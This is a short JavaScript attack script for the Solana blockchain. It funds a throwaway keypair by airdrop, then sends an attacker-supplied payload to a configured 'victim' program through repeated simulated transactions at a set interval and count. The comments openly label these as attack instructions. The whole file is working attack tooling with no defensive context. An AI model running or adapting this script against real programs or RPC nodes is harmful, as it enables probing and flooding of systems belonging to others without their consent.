import { Connection, LAMPORTS_PER_SOL, Keypair} from '@solana/web3.js';
import web3 from  '@solana/web3.js';
import BufferLayout from '@solana/buffer-layout';
import { readFileSync } from 'fs';

//get config
const config = JSON.parse(readFileSync('./config.json', 'utf8'));
const url = config.syncUrl;
const programId = config.victimId;
// console.log(programId);
const interval = parseInt(config.interval);
const sentCount = parseInt(config.sentCount);

const connection = new Connection(url,'confirmed');
const account = Keypair.generate();

await connection.requestAirdrop(account.publicKey, 0.001 * LAMPORTS_PER_SOL);
while(true){
  await new Promise((resolve) => setTimeout(resolve, 100));
  if (await connection.getBalance(account.publicKey)) break;
}

//encode payload data,payload get from shell parameter
const args = process.argv.splice(2);
const payload = args.at(0);

const ds = BufferLayout.cstr();
const data = Buffer.alloc(payload.length);

ds.encode(payload, data);


//get attack instruction
const instructions = [
  new web3.TransactionInstruction({
    keys: [],
    programId: new web3.PublicKey(programId),
    data: data,
  }),
];

//send simulate transaction in "interval" interval for "sendTime" time 

var sendConunt = 0;
const address = account.publicKey.toString();

var simulateSend = setInterval(async function(){
  //get attack message
  const messageV0 = new web3.TransactionMessage({
    payerKey: account.publicKey,
    recentBlockhash: await connection.getLatestBlockhash().then((res) => res.blockhash),
    instructions,
  }).compileToV0Message();

  // create an versioned transaction
  const transaction = new web3.VersionedTransaction(messageV0);

  //send simulate transaction
connection.simulateTransaction(transaction);
  sendConunt += 1;
  // console.log("number of account \"",address,"\" transactions sent out:",sendConunt);
  if(sendConunt == sentCount) clearInterval(simulateSend);
}, interval);
